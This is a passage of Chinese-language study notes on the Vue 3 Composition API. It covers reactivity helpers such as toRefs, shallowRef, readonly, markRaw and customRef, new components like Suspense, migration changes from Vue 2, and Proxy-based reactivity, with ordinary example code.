      - watchEffect的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。
      - 默认初始时就会执行第一次, 从而可以收集需要监视的数据
      - 监视数据发生变化时回调
      - watchEffect有点像computed：
         - 但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。
         - 而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。

         ```js
         //watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。
         watchEffect(()=>{
               const x1 = sum.value
               const x2 = person.age
               console.log('watchEffect配置的回调执行了')
         })
         ```

### 自定义hook函数

   - 什么是hook？—— 本质是一个函数，把setup函数中使用的Composition API进行了封装。

   - 类似于vue2.x中的mixin。

   - 自定义hook的优势: 复用代码, 让setup中的逻辑更清楚易懂。    

### toRef 和 toRefs

   - 作用：创建一个 ref 对象，其value值指向另一个对象中的某个属性。
   - 语法：```const name = toRef(person,'name')```
   - 应用:   要将响应式对象中的某个属性单独提供给外部使用时。
   - 扩展：```toRefs``` 与```toRef```功能一致，但可以批量创建多个 ref 对象，语法：```toRefs(person)```

      ```js
      <template>
        <h2>App</h2>
        <h3>foo: {{foo}}</h3>
        <h3>bar: {{bar}}</h3>
        <h3>foo2: {{foo2}}</h3>
        <h3>bar2: {{bar2}}</h3>
      
      
      </template>
      
      <script lang="ts">
      import { reactive, toRefs } from 'vue'
      /*
      toRefs:
        将响应式对象中所有属性包装为ref对象, 并返回包含这些ref对象的普通对象
        应用: 当从合成函数返回响应式对象时，toRefs 非常有用，
              这样消费组件就可以在不丢失响应式的情况下对返回的对象进行分解使用
      */
      export default {
      
        setup () {
      
          const state = reactive({
            foo: 'a',
            bar: 'b',
          })
      
          const stateAsRefs = toRefs(state)
      
          setTimeout(() => {
            state.foo += '++'
            state.bar += '++'
          }, 2000);
      
          const {foo2, bar2} = useReatureX()
      
          return {
            // ...state,
            ...stateAsRefs,
            foo2, 
            bar2
          }
        },
      }
      
      function useReatureX() {
        const state = reactive({
          foo2: 'a',
          bar2: 'b',
        })
      
        setTimeout(() => {
          state.foo2 += '++'
          state.bar2 += '++'
        }, 2000);
      
        return toRefs(state)
      }
      
      </script>
      ```

### ref

  - 利用ref函数获取组件中的标签元素

      ```html
      <template>
        <h2>App</h2>
        <input type="text">---
        <input type="text" ref="inputRef">
      </template>
      
      <script lang="ts">
      import { onMounted, ref } from 'vue'
      /* 
      ref获取元素: 利用ref函数获取组件中的标签元素
      功能需求: 让输入框自动获取焦点
      */
      export default {
        setup() {
          const inputRef = ref<HTMLElement|null>(null)
      
          onMounted(() => {
            inputRef.value && inputRef.value.focus()
          })
      
          return {
            inputRef
          }
        },
      }
      </script>
      ```

### shallowReactive 与 shallowRef

  - shallowReactive : 只处理了对象内最外层属性的响应式(也就是浅响应式)
  - shallowRef: 只处理了value的响应式, 不进行对象的reactive处理
  - 什么时候用浅响应式呢?
      - 一般情况下使用ref和reactive即可
      - 如果有一个对象数据, 结构比较深, 但变化时只是外层属性变化 ===> shallowReactive
      - 如果有一个对象数据, 后面会产生新的对象来替换 ===> shallowRef

    ```vue
    <template>
      <h2>App</h2>
    
      <h3>m1: {{m1}}</h3>
      <h3>m2: {{m2}}</h3>
      <h3>m3: {{m3}}</h3>
      <h3>m4: {{m4}}</h3>
    
      <button @click="update">更新</button>
    </template>
    
    <script lang="ts">
    import { reactive, ref, shallowReactive, shallowRef } from 'vue'
    /* 
    shallowReactive与shallowRef
      shallowReactive: 只处理了对象内最外层属性的响应式(也就是浅响应式)
      shallowRef: 只处理了value的响应式, 不进行对象的reactive处理
    总结:
      reactive与ref实现的是深度响应式, 而shallowReactive与shallowRef是浅响应式
      什么时候用浅响应式呢?
        一般情况下使用ref和reactive即可,
        如果有一个对象数据, 结构比较深, 但变化时只是外层属性变化 ===> shallowReactive
        如果有一个对象数据, 后面会产生新的对象来替换 ===> shallowRef
    */
    
    export default {
    
      setup () {
    
        const m1 = reactive({a: 1, b: {c: 2}})
        const m2 = shallowReactive({a: 1, b: {c: 2}})
    
        const m3 = ref({a: 1, b: {c: 2}})
        const m4 = shallowRef({a: 1, b: {c: 2}})
    
        const update = () => {
          // m1.b.c += 1
          // m2.b.c += 1
    
          // m3.value.a += 1
          m4.value.a += 1
        }
    
        return {
          m1,
          m2,
          m3,
          m4,
          update,
        }
      }
    }
    </script>
    ```


### readonly 与 shallowReadonly

  - readonly:
      - 深度只读数据
      - 获取一个对象 (响应式或纯对象) 或 ref 并返回原始代理的只读代理。
      - 只读代理是深层的：访问的任何嵌套 property 也是只读的。
  - shallowReadonly
      - 浅只读数据
      - 创建一个代理，使其自身的 property 为只读，但不执行嵌套对象的深度只读转换
  - 应用场景:
      - 在某些特定情况下, 我们可能不希望对数据进行更新的操作, 那就可以包装生成一个只读代理对象来读取数据, 而不能修改或删除

      ```html
      <template>
        <h2>App</h2>
        <h3>{{state}}</h3>
        <button @click="update">更新</button>
      </template>
      
      <script lang="ts">
      import { reactive, readonly, shallowReadonly } from 'vue'
      /*
      readonly: 深度只读数据
        获取一个对象 (响应式或纯对象) 或 ref 并返回原始代理的只读代理。
        只读代理是深层的：访问的任何嵌套 property 也是只读的。
      shallowReadonly: 浅只读数据
        创建一个代理，使其自身的 property 为只读，但不执行嵌套对象的深度只读转换 
      应用场景: 
        在某些特定情况下, 我们可能不希望对数据进行更新的操作, 那就可以包装生成一个只读代理对象来读取数据, 而不能修改或删除
      */
      
      export default {
      
        setup () {
      
          const state = reactive({
            a: 1,
            b: {
              c: 2
            }
          })
      
          // const rState1 = readonly(state)
          const rState2 = shallowReadonly(state)
      
          const update = () => {
            // rState1.a++ // error
            // rState1.b.c++ // error
      
            // rState2.a++ // error
            rState2.b.c++
          }
          
          return {
            state,
            update
          }
        }
      }
      </script>
      ```

### toRaw 与 markRaw

  - toRaw
      - 返回由 `reactive` 或 `readonly` 方法转换成响应式代理的普通对象。
      - 这是一个还原方法，可用于临时读取，访问不会被代理/跟踪，写入时也不会触发界面更新。
  - markRaw
      - 标记一个对象，使其永远不会转换为代理。返回对象本身
      - 应用场景:
          - 有些值不应被设置为响应式的，例如复杂的第三方类实例或 Vue 组件对象。
          - 当渲染具有不可变数据源的大列表时，跳过代理转换可以提高性能。

      ```html
      <template>
        <h2>{{state}}</h2>
        <button @click="testToRaw">测试toRaw</button>
        <button @click="testMarkRaw">测试markRaw</button>
      </template>
      
      <script lang="ts">
      /* 
      toRaw: 得到reactive代理对象的目标数据对象
      */
      import {
        markRaw,
        reactive, toRaw,
      } from 'vue'
      export default {
        setup () {
          const state = reactive<any>({
            name: 'tom',
            age: 25,
          })
      
          const testToRaw = () => {
            const user = toRaw(state)
            user.age++  // 界面不会更新
      
          }
      
          const testMarkRaw = () => {
            const likes = ['a', 'b']
            // state.likes = likes
            state.likes = markRaw(likes) // likes数组就不再是响应式的了
            setTimeout(() => {
              state.likes[0] += '--'
            }, 1000)
          }
      
          return {
            state,
            testToRaw,
            testMarkRaw,
          }
        }
      }
      </script>
      ```

### toRef

  - 为源响应式对象上的某个属性创建一个 ref对象, 二者内部操作的是同一个数据值, 更新时二者是同步的
  - 区别ref: 拷贝了一份新的数据值单独操作, 更新时相互不影响
  - 应用: 当要将 某个prop 的 ref 传递给复合函数时，toRef 很有用

    ```html
    <template>
      <h2>App</h2>
      <p>{{state}}</p>
      <p>{{foo}}</p>
      <p>{{foo2}}</p>
    
      <button @click="update">更新</button>
    
      <Child :foo="foo"/>
    </template>
    
    <script lang="ts">
    /*
    toRef:
      为源响应式对象上的某个属性创建一个 ref对象, 二者内部操作的是同一个数据值, 更新时二者是同步的
      区别ref: 拷贝了一份新的数据值单独操作, 更新时相互不影响
      应用: 当要将某个 prop 的 ref 传递给复合函数时，toRef 很有用
    */
    
    import {
      reactive,
      toRef,
      ref,
    } from 'vue'
    import Child from './Child.vue'
    
    export default {
    
      setup () {
    
        const state = reactive({
          foo: 1,
          bar: 2
        })
    
        const foo = toRef(state, 'foo')
        const foo2 = ref(state.foo)
    
        const update = () => {
          state.foo++
          // foo.value++
          // foo2.value++  // foo和state中的数据不会更新
        }
    
        return {
          state,
          foo,
          foo2,
          update,
        }
      },
    
      components: {
        Child
      }
    }
    </script>
    ```

    ```html
    <template>
      <h2>Child</h2>
      <h3>{{foo}}</h3>
      <h3>{{length}}</h3>
    </template>
    
    <script lang="ts">
    import { computed, defineComponent, Ref, toRef } from 'vue'
    
    const component = defineComponent({
      props: {
        foo: {
          type: Number,
          require: true
        }
      },
    
      setup (props, context) {
        const length = useFeatureX(toRef(props, 'foo'))
    
        return {
          length
        }
      }
    })
    
    function useFeatureX(foo: Ref) {
      const lenth = computed(() => foo.value.length)
    
      return lenth
    }
    
    export default component
    </script>
    ```

 ### customRef

  - 创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制，它需要一个工厂函数，该函数接收 `track` 和 `trigger` 函数作为参数，并且应该返回一个带有 `get` 和 `set` 的对象。
  - 需求: 使用 customRef 实现 debounce 的示例

    ```html
    <template>
      <div>
        <h3>CustomRef的使用</h3>
        <input type="text" v-model="keyword" />
        <h4>{{ keyword }}</h4>
      </div>
    </template>
    
    <script lang="ts">
    import { customRef, defineComponent } from "vue";
    // 自定义hook防抖函数
    function useDebounceRef<T>(value: T, delay: number = 200) {
      // 准备存储定时器id的变量
      let timer: number;
      return customRef((track, tigger) => {
        return {
          // 返回数据
          get() {
            // 告诉Vue追踪数据
            track();
            return value;
          },
          set(newVal: T) {
            // 清除定时器
            clearTimeout(timer);
            // 开启定时器
            timer = setTimeout(() => {
              value = newVal;
              // 告诉Vue更新界面
              tigger();
            }, delay);
          }
        };
      });
    }
    
    export default defineComponent({
      setup() {
        const keyword = useDebounceRef("111", 500);
        return {
          keyword
        };
      }
    });
    </script>
    
    <style scoped>
    </style>
    ```

### provide 与 inject
   - <img src="https://v3.cn.vuejs.org/images/components_provide.png" style="width:300px" /><br/>
   - 作用：实现<strong style="color:#DD5145">祖与后代组件间</strong>通信
   - 套路：父组件有一个 `provide` 选项来提供数据，后代组件有一个 `inject` 选项来开始使用这些数据
   - `provide`和`inject`提供依赖注入，功能类似 2.x 的`provide/inject`
   - 具体写法：
      1. 祖组件中：

         ```js
         setup(){
            ......
               let car = reactive({name:'奔驰',price:'40万'})
               provide('car',car)
               ......
         }
         ```

      2. 后代组件中：

         ```js
         setup(props,context){
            ......
               const car = inject('car')
               return {car}
            ......
         }
         ```

### 响应式数据的判断

  - isRef: 检查一个值是否为一个 ref 对象
  - isReactive: 检查一个对象是否是由 `reactive` 创建的响应式代理
  - isReadonly: 检查一个对象是否是由 `readonly` 创建的只读代理
  - isProxy: 检查一个对象是否是由 `reactive` 或者 `readonly` 方法创建的代理

## Composition API 的优势

### 1.Options API 存在的问题

使用传统OptionsAPI中，新增或者修改一个需求，就需要分别在data，methods，computed里修改 。

<div style="height:370px;overflow:hidden;">
    <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f84e4e2c02424d9a99862ade0a2e4114~tplv-k3u1fbpfcp-watermark.image" style="width:600px;margin-right:20px" />
    <img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e5ac7e20d1784887a826f6360768a368~tplv-k3u1fbpfcp-watermark.image" style="zoom:50%;width:560px;" /> 
</div>


### 2.Composition API 的优势

我们可以更加优雅的组织我们的代码，函数。让相关功能的代码更加有序的组织在一起。

<div style="height:340px;overflow:hidden;">
    <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bc0be8211fc54b6c941c036791ba4efe~tplv-k3u1fbpfcp-watermark.image"style="height:360px;margin-right:20px"/>
    <img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6cc55165c0e34069a75fe36f8712eb80~tplv-k3u1fbpfcp-watermark.image"style="height:360px"/>
</div>



## 新组件

### Fragment（代码片段）

  - 在Vue2中: 组件必须有一个根标签
  - 在Vue3中: 组件可以没有根标签, 内部会将多个标签包含在一个Fragment虚拟元素中
  - 好处: 减少标签层级, 减小内存占用

    ```html
    <template>
        <h2>aaaa</h2>
        <h2>aaaa</h2>
    </template>
    ```

### Teleport(瞬移)

  - Teleport 提供了一种干净的方法, 让组件的html在父组件界面外的特定标签(很可能是body)下插入显示

### Suspense(不确定的)

  - 它们允许我们的应用程序在等待异步组件时渲染一些后备内容，可以让我们创建一个平滑的用户体验
  - 使用步骤：

      - 异步引入组件

         ```js
         import {defineAsyncComponent} from 'vue'
         const Child = defineAsyncComponent(()=>import('./components/Child.vue'))
         ```

      - 使用```Suspense```包裹组件，并配置好```default``` 与 ```fallback```

         ```vue
         <template>
            <div class="app">
               <h3>我是App组件</h3>
               <Suspense>
                  <template v-slot:default>
                     <Child/>
                  </template>
                  <template v-slot:fallback>
                     <h3>加载中.....</h3>
                  </template>
               </Suspense>
            </div>
         </template>
         ```

## 其他

### 1.全局API的转移

- Vue 2.x 有许多全局 API 和配置。

  - 例如：注册全局组件、注册全局指令等。

    ```js
    //注册全局组件
    Vue.component('MyButton', {
      data: () => ({
        count: 0
      }),
      template: '<button @click="count++">Clicked {{ count }} times.</button>'
    })
    
    //注册全局指令
    Vue.directive('focus', {
      inserted: el => el.focus()
    }
    ```

- Vue3.0中对这些API做出了调整：

  - 将全局的API，即：```Vue.xxx```调整到应用实例（```app```）上

    | 2.x 全局 API（```Vue```） | 3.x 实例 API (`app`)                        |
    | ------------------------- | ------------------------------------------- |
    | Vue.config.xxxx           | app.config.xxxx                             |
    | Vue.config.productionTip  | <strong style="color:#DD5145">移除</strong> |
    | Vue.component             | app.component                               |
    | Vue.directive             | app.directive                               |
    | Vue.mixin                 | app.mixin                                   |
    | Vue.use                   | app.use                                     |
    | Vue.prototype             | app.config.globalProperties                 |

### 2.其他改变

- data选项应始终被声明为一个函数。

- 过度类名的更改：

  - Vue2.x写法

    ```css
    .v-enter,
    .v-leave-to {
      opacity: 0;
    }
    .v-leave,
    .v-enter-to {
      opacity: 1;
    }
    ```

  - Vue3.x写法

    ```css
    .v-enter-from,
    .v-leave-to {
      opacity: 0;
    }
    
    .v-leave-from,
    .v-enter-to {
      opacity: 1;
    }
    ```

- <strong style="color:#DD5145">移除</strong>keyCode作为 v-on 的修饰符，同时也不再支持```config.keyCodes```

- <strong style="color:#DD5145">移除</strong>```v-on.native```修饰符

  - 父组件中绑定事件

    ```vue
    <my-component
      v-on:close="handleComponentEvent"
      v-on:click="handleNativeClickEvent"
    />
    ```

  - 子组件中声明自定义事件

    ```vue
    <script>
      export default {
        emits: ['close']
      }
    </script>
    ```

- <strong style="color:#DD5145">移除</strong>过滤器（filter）

  > 过滤器虽然这看起来很方便，但它需要一个自定义语法，打破大括号内表达式是 “只是 JavaScript” 的假设，这不仅有学习成本，而且有实现成本！建议用方法调用或计算属性去替换过滤器

### 3.模板语法变化

   1. v-model的本质变化
         - prop：value -> modelValue；
         - event：input -> update:modelValue；

         ```html
         <template>
            <div>
               <h3>v-model</h3>
         
               <button @click="openVisible = true">显示数据</button>
               <Child v-model:show="openVisible"></Child>
            </div>
         </template>
         
         <script lang="ts">
         import { defineComponent, ref } from "vue";
         import Child from "./components/child.vue";
         export default defineComponent({
            components: {
               Child
            },
            setup() {
               const openVisible = ref(false);
               return {
               openVisible
               };
            }
         });
         </script>
         
         <style scoped>
         </style>
         ```

         ```html
         <template>
            <div>
               <transition name="fade">
               <!-- <div v-if="modelValue">
                  <p>hello</p>
                  <button @click="hideModal">关闭</button>
               </div> -->
               <div v-if="show">
                  <p>hello</p>
                  <button @click="hideModal">关闭</button>
               </div>
               </transition>
            </div>
         </template>
         
         <script lang="ts">
         import {
            defineComponent,
            onRenderTriggered,
            onActivated,
            onDeactivated,
            onErrorCaptured
         } from "vue";
         
         export default defineComponent({
            //   props: {
            //     modelValue: Boolean
            //   },
            //   emit: ["update:modelValue"],
            //   setup(props, context) {
            //     const hideModal = () => {
            //       context.emit("update:modelValue", false);
            //     };
         
            //     return {
            //       hideModal
            //     };
            //   }
            props: {
               show: Boolean
            },
            emits: ["update:show"],
            renderTriggered() {
               console.log(21321312);
            },
            setup(props, context) {
               const hideModal = () => {
               context.emit("update:show", false);
               };
               return {
               hideModal
               };
            }
         });
         </script>
         
         <style scoped>
         .fade-enter-active,
         .fade-leave-active {
            transition: opacity 0.5s ease;
         }
         
         .fade-enter-from,
         .fade-leave-to {
            opacity: 0;
         }
         </style>
         ```


   2. .sync修改符已移除, 由v-model代替

   3. v-if优先v-for解析

## 响应式原理

### vue2.x的响应式

  - 实现原理：

      - 对象类型：通过```Object.defineProperty()```对属性的读取、修改进行拦截（数据劫持）。

      - 数组类型：通过重写更新数组的一系列方法来实现拦截。（对数组的变更方法进行了包裹）。

        ```js
        Object.defineProperty(data, 'count', {
            get () {}, 
            set () {}
        })
        ```

  - 存在问题：

      - 新增属性、删除属性, 界面不会更新。
      - 直接通过下标修改数组, 界面不会自动更新。

### Vue3.0的响应式

  - 实现原理:

      - 通过Proxy（代理）:  拦截对象中任意属性的变化, 包括：属性值的读写、属性的添加、属性的删除等。

      - 通过Reflect（反射）:  对源对象的属性进行拦截操作。 

      - MDN文档中描述的Proxy与Reflect：

          - Proxy：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy

          - Reflect：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect

            ```js
            new Proxy(data, {
                // 拦截读取属性值
                get (target, prop) {
                    return Reflect.get(target, prop)
                },
                // 拦截设置属性值或添加新属性
                set (target, prop, value) {
                    return Reflect.set(target, prop, value)
                },
                // 拦截删除属性
                deleteProperty (target, prop) {
                    return Reflect.deleteProperty(target, prop)
                }
            })
          
            proxy.name = 'tom'   
            ```

